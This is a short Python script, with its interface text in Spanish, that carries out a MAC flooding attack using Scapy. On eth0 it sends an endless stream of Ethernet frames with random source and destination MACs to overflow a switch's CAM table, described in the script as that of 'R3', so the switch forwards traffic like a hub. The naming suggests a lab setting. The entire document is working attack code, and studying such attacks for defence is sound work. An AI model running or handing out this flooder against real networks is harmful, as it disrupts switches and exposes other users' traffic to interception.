#!/usr/bin/env python3
import random, sys, signal, time
from scapy.all import Ether, sendp, conf

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

IFACE    = "eth0"
stats    = {"sent": 0, "start": None}
conf.verb = 0

def signal_handler(sig, frame):
    elapsed = time.time() - stats["start"]
    pps = stats["sent"] / elapsed if elapsed > 0 else 0
    print(f"\n{YELLOW}[!] Ataque detenido.{RESET}")
    print(f"{GREEN}[+] Tramas enviadas: {stats['sent']} | {pps:.0f} pkt/s{RESET}")
    sys.exit(0)

def random_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))

def main():
    signal.signal(signal.SIGINT, signal_handler)
    print(f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════╗
║          MAC FLOODING ATTACK - Scapy             ║
║  Objetivo  : Saturar tabla CAM de R3             ║
║  Efecto    : Switch actua como HUB               ║
╚══════════════════════════════════════════════════╝
{RESET}
{YELLOW}[!] Inundando tabla CAM... Ctrl+C para detener{RESET}
""")
    stats["start"] = time.time()
    while True:
        pkt = Ether(src=random_mac(), dst=random_mac()) / (b"\x00" * 64)
        sendp(pkt, iface=IFACE, verbose=False)
        stats["sent"] += 1
        if stats["sent"] % 500 == 0:
            elapsed = time.time() - stats["start"]
            pps = stats["sent"] / elapsed if elapsed > 0 else 0
            print(f"\r{RED}[*] Tramas: {stats['sent']:,} | {pps:.0f} pkt/s{RESET}", end="", flush=True)

if __name__ == "__main__":
    main()
